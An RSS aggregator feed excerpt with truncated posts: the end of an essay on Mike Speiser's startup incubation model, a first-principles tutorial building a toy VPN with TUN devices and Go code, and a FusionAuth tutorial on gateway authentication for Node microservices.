<p>Similarly, Speiser is likely to have more experience in setting up companies and the initial customer development process than the founders will. Perhaps most importantly, he has relationships with customers and an established reputation that can be used to bootstrap the initial pilot conversations, which may be the point of highest leverage for these new startups.</p>



<p>These advantages all <em>compound</em> with every incremental company Speiser originates, and not just because of the typical brand network effects that venture has broadly. In many tangible ways, the spread between Speiser’s process knowledge relative to a new founder should widen with every new company.</p>



<p>As an industry we seem to often want to see machismo and martyrdom in founders. A decade ago it was wanting founders to be willing to mortgage their house and their kids’ college fund. Now it is founders wanting to be in charge of every aspect of companies. If founders aren’t willing to put everything on the line for the company their companies will be worse is the thought. As an ecosystem it doesn’t appear the data bears this out. Everything we do that has expanded opportunity and decreased the friction to more people becoming founders has led to huge benefits for the industry.</p>



<p>Just as Eric Yuan should be a massive shot across the bow for all large tech incumbents, Snowflake’s founders should be a wakeup call to venture that we have much further to go to enable and support even more brilliant people who don’t think of themselves as CEOs to bring their vision of the world into existence.</p>



<h3>A better package for CEOs</h3>



<p>But this isn’t the only talent arbitrage Speiser’s playbook benefits from. The interim CEO model allows another one too. As the startup does well and figures out its product market fit, Speiser eventually rolls off as CEO and finds a full-time replacement to take on the role as he takes a step back into being solely a board member.</p>



<p>His companies are <em>very</em> advantaged in finding great CEOs to take the mantle. To understand why, look at it from the perspective of an executive looking to become the CEO of a company. Like the potential founders, these executives have their own Scylla and Charybdis dilemma. They want to be CEO of a company, but they also want to join a company that has already …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kwokchain.com/2020/09/22/the-mike-speiser-incubation-playbook/">https://kwokchain.com/2020/09/22/the-mike-speiser-incubation-playbook/</a></em></p>]]>
            </description>
            <link>https://kwokchain.com/2020/09/22/the-mike-speiser-incubation-playbook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24549767</guid>
            <pubDate>Tue, 22 Sep 2020 00:29:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VPNs from First Principles]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24549031">thread link</a>) | @setheron
<br/>
September 21, 2020 | https://fzakaria.com/2020/09/20/vpns-from-first-principles.html | <a href="https://web.archive.org/web/*/https://fzakaria.com/2020/09/20/vpns-from-first-principles.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <blockquote>
  <p>If you enjoy the <em>from first principles</em> theme, consider reading the one
on <a href="https://fzakaria.com/2020/05/31/containers-from-first-principles.html">containers</a>.</p>
</blockquote>

<p>Networking can seem like <em>voodoo</em>; many of us take for granted how data transmits from one computer to the next. Recently, <a href="https://www.wireguard.com/">wireguard</a>, has attracted a lot of publicity for it’s inclusion into the Linux kernel &amp; for it’s stated goal of making setting up VPNs simpler.</p>

<p>Behind all the magic, is a very simple premise. Let’s shed some of the complexity and break it down to <em>first principles</em>.</p>

<!--more-->

<blockquote>
  <p>A virtual private network extends a private network across a public network and enables users to send and receive data across shared or public networks as if their computing devices were directly connected to the private network. <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>
</blockquote>

<p><img src="https://fzakaria.com/assets/images/VPN_overview-en.svg" alt="VPN graphic"></p>

<p>The definition seems <em>simple</em> enough. Bridge two discrete private networks &amp; make them look like they are <strong>one</strong>.</p>

<p>We will accomplish this task with a <em>tunnel</em>.</p>

<!--more-->

<h3 id="network-reachability">Network Reachability</h3>

<p>Let’s consider a very simple example with two distinct private networks: <em>home</em> &amp; <em>office</em>.</p>

<p><strong>Home Network</strong>: Is the 192.168.1.0/24 subnet and has a laptop with the <em>private IP address</em> of 192.168.1.192.</p>

<p><strong>Office Network</strong>: Is the 172.31.0.1/20 subnet and has a server with <em>private IP address</em> of 172.31.9.116 &amp; a <em>public IP address</em> of 54.219.126.112.</p>

<p><img src="https://fzakaria.com/assets/images/vpn_simple_drawing.png" alt="VPN graphic"></p>

<blockquote>
  <p>I did not include the routers or gateways in the figure.</p>
</blockquote>

<p>This is pretty common to what most people might experience with their home setup.</p>

<p><em>private</em> IP addresses are those that can only be reached from other machines within the subnet.</p>

<p><em>public</em> IP addresses are those that are broadcasted to neighboring routers and exchanged via the BGP protocol.</p>

<p>The goal of the tunnel will be to join these two <em>distinct</em> subnets into a <em>virtual</em> one; a <em>virtual private network</em> (VPN).</p>

<p><img src="https://fzakaria.com/assets/images/vpn_simple_drawing_merge.png" alt="VPN graphic"></p>

<p>Let’s choose a VPN CIDR range of 172.31.255.0/24. I don’t need a subnet so large, so let’s set a mask of /24 which gives us ~254 hosts.</p>

<p>We will then assign two IP addresses within that subnet to the two hosts.</p>

<p><strong>Server</strong>: 172.31.255.13</p>

<p><strong>Laptop</strong>: 172.31.255.7</p>

<blockquote>
  <p>The private network address range is 172.16.0.0/12 according to <a href="https://www.arin.net/reference/research/statistics/address_filters/">https://www.arin.net/reference/research/statistics/address_filters/</a></p>
</blockquote>

<h3 id="tun-network-interface-device">TUN network interface device</h3>

<p>The first step in setting up our tunnel will be to create a <em>tun</em> network interface device<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>. A <em>tun</em> device is a kernel virtual network device, they are not backed by a physical device.</p>

<p>Packets sent by the operating system via the <em>tun</em> device are delivered to a user space program which attaches itself to the device. A userspace program may also pass packets into a <em>tun</em> device. In this case the device delivers these packets to the operating-system network stack thus emulating as if it has arrived from an external source.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>

<blockquote>
  <p><em>tun</em> devices operate at the L3 layer (IP). There is an analogous <em>tap</em> device that operates at the L2 layer (Ethernet).</p>
</blockquote>

<div><div><pre><code><span># on server &amp; laptop run the following</span>
<span># adding the user will allow userspace programs running as that user</span>
<span># to attach to it without needing `sudo`</span>
<span>&gt;</span> <span>sudo </span>ip tuntap add dev tun0 mode tun user <span>$USER</span>
<span>&gt;</span> <span>sudo </span>ip <span>link set </span>dev tun0 up

<span>&gt;</span> ip <span>-d</span> <span>link </span>show tun0
9: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 500
    <span>link</span>/none  promiscuity 0 minmtu 68 maxmtu 65535
    tun <span>type </span>tun pi on vnet_hdr off persist on user youruser addrgenmode random numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535
</code></pre></div></div>

<p>We then need to assign the new <em>private IP addresses</em> for our new subnet.</p>

<div><div><pre><code><span># on the laptop run the following</span>
<span>&gt;</span> <span>sudo </span>ip addr add 172.31.255.7/24 dev tun0
<span># on the server run the following</span>
<span>&gt;</span> <span>sudo </span>ip addr add 172.31.255.13/24 dev tun0
</code></pre></div></div>

<p>Now let’s create a general routing rule so that anything destined for that subnet routes to the desired <em>tun</em> device.</p>

<div><div><pre><code><span># run the following on both laptop &amp; server</span>
<span>&gt;</span> <span>sudo </span>ip route add 172.16.0.0/12 dev tun0

<span># Let's validate our route. Pick a machine and</span>
<span># test the route for the other one.</span>
<span>&gt;</span> ip route get 172.31.255.8
172.31.255.8 dev tun0 src 172.31.255.7 uid 780412
    cache
</code></pre></div></div>

<blockquote>
  <p>We make sure to test the route with an IP address not present on either machine, otherwise it will match to the <em>lo</em> (loopback) device.</p>
</blockquote>

<p>Great! We have setup some network interfaces and routing rules, but what is actually transmitting the packets to give the <em>illusion</em> of a single network?</p>

<p>Our <strong>tunneling</strong> software.</p>

<h3 id="lametun">lametun</h3>

<p>The <em>heart</em> to setting up VPN is the software bridging the packets across the two networks. In our case, we will be using a userspace program and the <em>tun</em> device; however <a href="https://www.wireguard.com/">wireguard</a> has included this capability within the kernel itself.</p>

<p>Since this will be a <em>toy</em> example, I’ve named the program <strong>lametun</strong>. It will be a single <em>golang</em> file with minimal dependencies to demonstrate how simple it is.</p>

<p><img src="https://fzakaria.com/assets/images/vpn_lametun_simple.png" alt="VPN graphic"></p>

<p><strong>lametun</strong> will read all incoming packets at a particular UDP port (i.e. <em>1234</em>) and write it to the <em>tun</em> device.</p>

<p><strong>lametun</strong> will read all outgoing packets from the <em>tun</em> device and write it back out the physical network device.</p>

<p>Both the <em>server</em> &amp; <em>laptop</em> will run <strong>lametun</strong> on UDP port <em>1234</em>, listening on the physical network device.</p>

<blockquote>
  <p>Make sure your firewall allows whatever port we are using for <strong>lametun</strong>.
I was using an EC2 host and had to also allow the UDP port through the SecurityGroup as well.</p>
</blockquote>

<p>The TUN device however emits raw L3 packets (IP packets), and the IP address of the device is not-routable. Simply copying the packet to the physical device is not enough; it must be routable.</p>

<p>We will <em>encapsulate</em> the packet with a routable IP &amp; UDP header destined for the VPN peer.</p>

<blockquote>
  <p>UDP is chosen since there is a lot of literature how TCP over TCP is a bad idea; TCP Meltdown.<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">5</a></sup></p>
</blockquote>

<h3 id="encapsulation">Encapsulation</h3>

<p>Encapsulation as a concept is straightforward. It is the act of embedding a protocol within the data/payload of another. Here we see an example of embedding TCP-IP within the payload of a UDP packet.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">6</a></sup></p>

<p><img src="https://fzakaria.com/assets/images/foo-encap.png" alt="VPN graphic"></p>

<p>Using encapsulation, we can now have non-routable packets traverse the Internet. Once they arrive at the <strong>lametun</strong> destination, the inner packet is forwarded onto the <em>tun</em> device to continue routing.</p>

<h3 id="mtu">MTU</h3>

<p>Typically, in order to guarantee delivery across the Internet, network devices restrict the <em>maximum transmission unit</em> (MTU), which is the size of the Ethernet frame, to <em>1500</em> bytes.</p>

<blockquote>
  <p>Although IP protocol supports fragmentation, there is no guarantee that every link along the way does. It’s best to stay within the 1500 byte limit.</p>
</blockquote>

<p>Given that we are embedding our transmission protocol within a IP-UDP datagram, we must account for this reserved headroom accordingly or risk breaking the 1500 byte boundary.</p>

<p>Given that the IP header is 20 bytes (minimum) and the UDP header is 8 bytes, our new MTU is <em>1472</em> bytes.</p>

<p>A simple demonstration will help.</p>

<div><div><pre><code><span># Upper limit MTU is 1500 safely across the Internet</span>
<span># IPv4 header is 20 bytes (minimum)</span>
<span># UDP header is 8 bytes</span>
<span># ICMP header is 8 bytes</span>
<span>#</span>
<span># 1500 - 20 (IP) - 8 (UDP) =  1472 new maximum MTU</span>
<span>#</span>
<span># 1472 - 20 (IP) - 8 (ICMP) = 1444 maximum payload for ICMP payload</span>
<span># (We actually remove another 4 bytes due to metadata the TUN device includes)</span>
<span># = 1440 maximum payload</span>

<span># We will run the following on the laptop</span>
<span>&gt;</span> ping <span>-M</span> <span>do</span> <span>-s</span> 1440 172.31.255.13

<span># Use wireshark to check the packet</span>
<span>&gt;</span> tshark udp port 1234
1 0.000000000 76.242.91.200 → 172.31.9.116 UDP 1514 1234 → 1234 <span>Len</span><span>=</span>1472

<span># If we bump the ICMP payload by a single byte, it will fragment</span>
<span>&gt;</span> ping <span>-M</span> <span>do</span> <span>-s</span> 1441 172.31.255.13

<span>&gt;</span> <span>sudo </span>tshark udp port 1234
1 0.000000000 76.242.91.200 → 172.31.9.116 IPv4 1514 Fragmented IP protocol <span>(</span><span>proto</span><span>=</span>UDP 17, <span>off</span><span>=</span>0, <span>ID</span><span>=</span>3136<span>)</span>
</code></pre></div></div>

<p>So we simply need to adjust the MTU on our TUN device accordingly.</p>

<div><div><pre><code><span># run the following on both laptop and server</span>
<span>&gt;</span> <span>sudo </span>ip <span>link set </span>dev tun0 mtu 1472
</code></pre></div></div>

<h3 id="code">Code</h3>

<p>Sweet! Enough theory, show me the code!</p>

<p>I’ve kept the code to a single-file for demonstration purposes but you can also find it on GitHub <a href="https://github.com/fzakaria/lametun">https://github.com/fzakaria/lametun</a>. It is heavily commented for learning purposes.</p>

<blockquote>
  <p>I tried to make the code somewhat Go-idiomatic without being too pedantic as a learning exercise. If you feel the code can be improved, please <a href="mailto:farid.m.zakaria@gmail.com">reach out</a> or open a pull-request.</p>
</blockquote>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
    <span>"flag"</span>
    <span>"fmt"</span>
    <span>"golang.org/x/sys/unix"</span>
    <span>"net"</span>
    <span>"os"</span>
    <span>"unsafe"</span>
<span>)</span>

<span>const</span> <span>(</span>
    <span>// sizeof(struct ifreq)</span>
    <span>IfReqSize</span> <span>=</span> <span>40</span>
<span>)</span>

<span>// let's open the TUN device</span>
<span>// A tun device is a bit wonky in that you have to first open "/dev/net/tun"</span>
<span>// then run a IOCTL syscall to turn the fd returned for the desired network tun device.</span>
<span>// This code makes use of some unsafe golang code, this is merely to avoid pulling in</span>
<span>// dependencies since this is for demonstration</span>
<span>func</span> <span>openTunDevice</span><span>(</span><span>dev</span> <span>string</span><span>)</span> <span>(</span><span>*</span><span>os</span><span>.</span><span>File</span><span>,</span> <span>error</span><span>)</span> <span>{</span>
    <span>fd</span><span>,</span> <span>err</span> <span>:=</span> <span>unix</span><span>.</span><span>Open</span><span>(</span><span>"/dev/net/tun"</span><span>,</span> <span>os</span><span>.</span><span>O_RDWR</span><span>,</span> <span>0</span><span>)</span>
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>return</span> <span>nil</span><span>,</span> <span>err</span>
    <span>}</span>

    <span>// IOCTL for TUN requires the ifreq struct</span>
    <span>// https://elixir.bootlin.com/linux/v5.8.10/source/include/uapi/linux/if.h#L234</span>
    <span>// we fill in the required struct members such as the device name &amp; that it is a TUN</span>
    <span>var</span> <span>ifr</span> <span>[</span><span>IfReqSize</span><span>]</span><span>byte</span>
    <span>copy</span><span>(</span><span>ifr</span><span>[</span><span>:</span><span>],</span> <span>dev</span><span>)</span>
    <span>*</span><span>(</span><span>*</span><span>uint16</span><span>)(</span><span>unsafe</span><span>.</span><span>Pointer</span><span>(</span><span>&amp;</span><span>ifr</span><span>[</span><span>unix</span><span>.</span><span>IFNAMSIZ</span><span>]))</span> <span>=</span> <span>unix</span><span>.</span><span>IFF_TUN</span>

    <span>_</span><span>,</span> <span>_</span><span>,</span> <span>errno</span> <span>:=</span> <span>unix</span><span>.</span><span>Syscall</span><span>(</span>
        <span>unix</span><span>.</span><span>SYS_IOCTL</span><span>,</span>
        <span>uintptr</span><span>(</span><span>fd</span><span>),</span>
        <span>uintptr</span><span>(</span><span>unix</span><span>.</span><span>TUNSETIFF</span><span>),</span>
        <span>uintptr</span><span>(</span><span>unsafe</span><span>.</span><span>Pointer</span><span>(</span><span>&amp;</span><span>ifr</span><span>[</span><span>0</span><span>])),</span>
    <span>)</span>

    <span>if</span> <span>errno</span> <span>!=</span> <span>0</span> <span>{</span>
        <span>return</span> <span>nil</span><span>,</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>"error syscall.Ioctl(): %v</span><span>\n</span><span>"</span><span>,</span> <span>errno</span><span>)</span>
    <span>}</span>

    <span>unix</span><span>.</span><span>SetNonblock</span><span>(</span><span>fd</span><span>,</span> <span>true</span><span>)</span>
    <span>return</span> <span>os</span><span>.</span><span>NewFile</span><span>(</span><span>uintptr</span><span>(</span><span>fd</span><span>),</span> <span>"/dev/net/tun"</span><span>),</span> <span>nil</span>
<span>}</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
    <span>port</span> <span>:=</span> <span>flag</span><span>.</span><span>Int</span><span>(</span><span>"port"</span><span>,</span> <span>1234</span><span>,</span> <span>"The protocol port for lametun"</span><span>)</span>
    <span>dev</span> <span>:=</span> <span>flag</span><span>.</span><span>String</span><span>(</span><span>"device"</span><span>,</span> <span>"tun0"</span><span>,</span> <span>"The TUN device name"</span><span>)</span>
    <span>listen</span> <span>:=</span> <span>flag</span><span>.</span><span>Bool</span><span>(</span><span>"listen"</span><span>,</span> <span>false</span><span>,</span> <span>"Whether to designate this machine as the server"</span><span>)</span>
    <span>server</span> <span>:=</span> <span>flag</span><span>.</span><span>String</span><span>(</span><span>"server"</span><span>,</span> <span>""</span><span>,</span> <span>"The server to connect to"</span><span>)</span>
    <span>flag</span><span>.</span><span>Parse</span><span>()</span>

    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"listen:%v server:%v dev:%v port:%v</span><span>\n</span><span>"</span><span>,</span> <span>*</span><span>listen</span><span>,</span> <span>*</span><span>server</span><span>,</span> <span>*</span><span>dev</span><span>,</span> <span>*</span><span>port</span><span>)</span>

    <span>if</span> <span>*</span><span>listen</span> <span>&amp;&amp;</span> <span>*</span><span>server</span> <span>!=</span> <span>""</span> <span>{</span>
        <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>os</span><span>.</span><span>Stderr</span><span>,</span> <span>"Cannot listen and set server flag</span><span>\n</span><span>"</span><span>)</span>
        <span>os</span><span>.</span><span>Exit</span><span>(</span><span>1</span><span>)</span>
    <span>}</span>

    <span>if</span> <span>!*</span><span>listen</span> <span>&amp;&amp;</span> <span>*</span><span>server</span> <span>==</span> <span>""</span> <span>{</span>
        <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>os</span><span>.</span><span>Stderr</span><span>,</span> <span>"You must …</span></code></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fzakaria.com/2020/09/20/vpns-from-first-principles.html">https://fzakaria.com/2020/09/20/vpns-from-first-principles.html</a></em></p>]]>
            </description>
            <link>https://fzakaria.com/2020/09/20/vpns-from-first-principles.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24549031</guid>
            <pubDate>Mon, 21 Sep 2020 22:14:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Authentication and authorization for a gateway app routing to two microservices]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548895">thread link</a>) | @mooreds
<br/>
September 21, 2020 | https://fusionauth.io/blog/2020/09/15/microservices-gateway | <a href="https://web.archive.org/web/*/https://fusionauth.io/blog/2020/09/15/microservices-gateway">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>In this article, we’re going to implement authentication and authorization for a gateway API application that routes to two different microservices. FusionAuth will be the auth server for the gateway.</p>

<!--more-->

<p>An API gateway with microservices is a common pattern for enterprise architectures. In this post, we’ll pretend we’re setting this up for an eCommerce enterprise. Our gateway application is a central API that will control access to a product catalog service and a product inventory service. We’ll allow customers to access public endpoints but require authentication for some of the product inventory endpoints.</p>

<p>For this article, we’re going to need a running FusionAuth instance and three simple Node/Express applications. You can download the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway">example project</a> for this article and customize your FusionAuth configuration accordingly, or you can follow along conceptually.</p>

<p>If you want to follow along, it will be very helpful to go through the <a href="https://fusionauth.io/docs/v1/tech/5-minute-setup-guide">5-Minute Setup Guide</a> first, as that will set up the needed users and roles in FusionAuth.</p>

<p>We’re going to have four applications running, on the following ports:</p>
<ul>
  <li>FusionAuth: <code>9011</code></li>
  <li>Gateway Application: <code>3000</code></li>
  <li>Product Catalog Service: <code>3001</code></li>
  <li>Product Inventory Service: <code>3002</code></li>
</ul>

<p>We’re also going to be dealing with authentication and authorization quite a bit, so let’s briefly clarify what we mean by these terms.</p>

<h2 id="authentication-and-authorization">Authentication and authorization</h2>
<p>Authentication is the verification of a particular user. When a user is logged in, they’re saying to the application, “Hey, it’s the real John Doe, let me in.” The application validates their credentials, and they have access.</p>

<p>In our API gateway, we’re going to use FusionAuth, based on the 5-Minute Setup Guide as mentioned above. We’ll talk about specific details when we set up our API gateway application later.</p>

<p>Authorization is the process whereby we verify that a particular user (e.g. John Doe) has access to certain parts of our system (e.g. product inventory). In our eCommerce ecosystem, we’re going to require authorization for the product inventory API, but not for the basic product APIs, since we want everyone to access the latter. For the product inventory route, we’ll allow users with the “admin” role access.</p>

<h2 id="product-catalog-service">Product Catalog service</h2>

<p>We’ll return to authentication and authorization soon, but let’s start building our applications! We’re going to start with the services and work our way towards the gateway application.</p>

<h3 id="setting-up-the-nodejs-product-catalog">Setting up the nodejs Product Catalog</h3>

<p>Before you get going, you’ll need node installed (code tested with version 14). If you don’t have it installed, grab it from <a href="https://nodejs.org/en/download/">the node website</a>.</p>

<p>Clone the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway">project</a> onto your local computer and <code>cd</code> into the directory.</p>

<p>You’ll notice three folders corresponding to our applications: <code>gateway</code>, <code>product-catalog</code>, and <code>product-inventory</code>. Go ahead and <code>cd</code> into the <code>product-catalog</code> application and do the following:</p>

<ul>
  <li>Run <code>npm install</code> to install the dependencies.</li>
  <li>Start the application by running <code>npm start</code>. It should be running on port <code>3001</code>, which is defined in <code>bin/www</code>.</li>
</ul>

<p>Now that your application is up and running, you should be able to send a request to it and get a response. Run this <code>curl</code> command in a separate terminal window and you should get a successful response with an empty list of products (<code>products: []</code>):</p>

<div><div><pre><code>curl http://localhost:3001/products
</code></pre></div></div>

<p>Let’s open up the hood on this and check out the <code>routes/index.js</code> file that gave us our <code>/products</code> route.</p>

<div><div><pre><code><span>const</span> <span>express</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>express</span><span>'</span><span>);</span>
<span>const</span> <span>router</span> <span>=</span> <span>express</span><span>.</span><span>Router</span><span>();</span>

<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/products</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>res</span><span>.</span><span>json</span><span>(</span><span>'</span><span>products: []</span><span>'</span><span>)</span>
<span>});</span>

<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/products/:id</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>res</span><span>.</span><span>json</span><span>(</span><span>`product: </span><span>${</span><span>req</span><span>.</span><span>params</span><span>.</span><span>id</span><span>}</span><span>`</span><span>)</span>
<span>});</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>router</span><span>;</span>
</code></pre></div></div>

<p>We’ve created two basic routes, <code>/products</code> and <code>/products/:id</code>, so we can get a list of products and a single product. Obviously, for a real microservice, these routes would request the product information from a datastore. For now, the former is returning an empty array <code>[]</code> and the latter returns the product id requested.</p>

<p>Try modifying your curl request to add a product ID, and notice that the response will indicate the specific ID you requested.</p>

<p>The Product Catalog service is ready to go!</p>

<h2 id="product-inventory-service">Product Inventory service</h2>

<p>Open up another terminal window and enter the <code>product-inventory</code> folder. Run <code>npm install</code> to install needed dependencies.</p>

<p>Here’s what our Product Inventory service looks like (in <code>routes/index.js</code>):</p>

<div><div><pre><code><span>const</span> <span>express</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>express</span><span>'</span><span>);</span>
<span>const</span> <span>router</span> <span>=</span> <span>express</span><span>.</span><span>Router</span><span>();</span>

<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/branches/:id/products</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>roles</span> <span>=</span> <span>req</span><span>.</span><span>headers</span><span>.</span><span>roles</span><span>;</span>
  <span>if</span> <span>(</span><span>roles</span> <span>&amp;&amp;</span> <span>roles</span><span>.</span><span>includes</span><span>(</span><span>'</span><span>admin</span><span>'</span><span>))</span> <span>{</span>
    <span>res</span><span>.</span><span>json</span><span>(</span><span>`Products for branch #</span><span>${</span><span>req</span><span>.</span><span>params</span><span>.</span><span>id</span><span>}</span><span>`</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>res</span><span>.</span><span>redirect</span><span>(</span><span>403</span><span>,</span> <span>'</span><span>http://localhost:3000</span><span>'</span><span>);</span>
    <span>return</span><span>;</span>
  <span>}</span>
<span>});</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>router</span><span>;</span>
</code></pre></div></div>

<p>In this service, we’ve just got one route, to get products for a specific store or branch. Notice, however, that we’re allowing access (or denying it) based on the inclusion of an <code>admin</code> role in the <code>roles</code> header. The API gateway application will be responsible for passing this data to our Product Inventory service.</p>

<p>If you were to start the service (go ahead and do so with <code>npm start</code>) and send a request to <code>http://localhost:3002/branches/1/products</code>, you should receive a 403. You can simulate a successful response by adding a <code>roles</code> header with a value of <code>admin</code>:</p>

<div><div><pre><code>curl <span>-i</span> <span>-H</span> <span>"Accept: application/json"</span> <span>-H</span> <span>"Content-Type: application/json"</span> <span>-H</span> <span>"roles: admin"</span> http://localhost:3002/branches/1/products
</code></pre></div></div>

<p>We’ve got our Product Inventory service up and running, with authorization to ensure that only admins can access a list of products for a branch. Doing an authorization check at the service level allows us to granularly implement authorization.</p>

<h3 id="api-level-authentication-for-your-microservices">API-level authentication for your microservices</h3>

<p>A quick note on API-level authentication. We’re implementing centralized authentication through the API gateway. Only that gateway should have access to these microservices. You could do this at the network level, or with some form of API-level authentication, like an <a href="https://microservice-api-patterns.org/patterns/quality/qualityManagementAndGovernance/APIKey">API Key</a>. It’s a little much for us to cover in this article, but it’s definitely something you’ll want to implement before launching your microservices into production.</p>

<h2 id="the-gateway-application">The gateway application</h2>

<p>Now that we’ve got our Product Catalog and Product Inventory services running on ports <code>3001</code> and <code>3002</code>, we’re ready to tackle the API gateway application.</p>

<p>Before we dive into the code, let’s briefly discuss why we’re creating our own gateway as opposed to using something like <a href="https://apigee.com/about/cp/api-gateway">Apigee</a> or <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html">Amazon’s API Gateway</a>. We certainly could go that route, but in creating our own gateway, we have ultimate flexibility. There’s an additional benefit of gaining an understanding of exactly what a gateway application is doing.</p>

<p>Our gateway application is straightforward and lightweight. It primarily functions as a router, directing requests to the appropriate service. But, because it’s a gateway to our distributed services, it’s the perfect spot for centralized user-level auth checks.</p>

<h3 id="centralized-authentication">Centralized authentication</h3>

<p>Centralizing authentication is a common pattern because authentication is primarily just a check to ensure the following:</p>

<ul>
  <li>The user is logged in</li>
  <li>The user is who they say they are</li>
</ul>

<p>In the context of separate services in an eCommerce domain, we want to have this centralized authentication so one check in the gateway gives a user access to the services, assuming their credentials check out. We’ll use FusionAuth for authenticating each of our routes before we forward them over to the right service.</p>

<h3 id="fusionauth-setup">FusionAuth Setup</h3>

<p>Open up yet another terminal window, enter the <code>gateway</code> director, and run <code>npm install</code>.</p>

<p>Head over to the <a href="https://fusionauth.io/docs/v1/tech/5-minute-setup-guide">5-Minute Setup Guide</a> for FusionAuth. During setup, the application that you configure will be linked to our gateway application, so you can name it “Gateway”. Note that while FusionAuth supports multi-tenant configurations, here you’re setting everything up in the default tenant.</p>

<p>Update the <code>routes/index.js</code> in the <code>gateway</code> directory with your FusionAuth application’s client ID and secret and <code>views/index.pug</code> with your client ID. Then start the application by running <code>npm start</code>.</p>

<p>This application will be our gateway (hence the name) to our services, so at this point, we should access our services only through the gateway application. Run the <code>curl</code> command for <code>/products</code>, but do so on port <code>3000</code>, which will hit our gateway application.</p>

<div><div><pre><code>curl http://localhost:3000/products
</code></pre></div></div>
<p>Now we’re funneling traffic through our gateway application and forwarding it over to the Product Catalog service. You can verify this by opening the terminal window for the running Product Catalog service and checking the logs. You should see the request we just sent hitting that server:</p>



<h3 id="routes">Routes</h3>

<p>Let’s go through the gateway application’s <code>routes/index.js</code> file step by step. We start by requiring necessary files and setting up a <code>FusionAuthClient</code>. We also include a handy authentication middleware, which we’ll use on our routes.</p>

<div><div><pre><code><span>// ...</span>
<span>const</span> <span>request</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>request</span><span>'</span><span>);</span>
<span>const</span> <span>express</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>express</span><span>'</span><span>);</span>
<span>const</span> <span>router</span> <span>=</span> <span>express</span><span>.</span><span>Router</span><span>();</span>
<span>const</span> <span>{</span><span>FusionAuthClient</span><span>}</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>@fusionauth/typescript-client</span><span>'</span><span>);</span>
<span>const</span> <span>clientId</span> <span>=</span> <span>[</span><span>YOUR_CLIENT_ID</span><span>];</span>
<span>const</span> <span>clientSecret</span> <span>=</span> <span>[</span><span>YOUR_CLIENT_SECRET</span><span>];</span>
<span>const</span> <span>client</span> <span>=</span> <span>new</span> <span>FusionAuthClient</span><span>(</span><span>'</span><span>noapikeyneeded</span><span>'</span><span>,</span> <span>'</span><span>http://localhost:9011</span><span>'</span><span>);</span>
<span>const</span> <span>checkAuthentication</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>../middleware</span><span>'</span><span>);</span>
<span>// ...</span>
</code></pre></div></div>

<p>Our gateway application, along with our services, are based on the <a href="https://github.com/FusionAuth/fusionauth-example-node">fusionauth-example-node</a> project, which gives us a basic UI (at the root) for interacting with FusionAuth. We also have a route for our OAuth redirect:</p>

<div><div><pre><code><span>// ...</span>
<span>/* GET home page. */</span>
<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/</span><span>'</span><span>,</span> <span>function</span> <span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
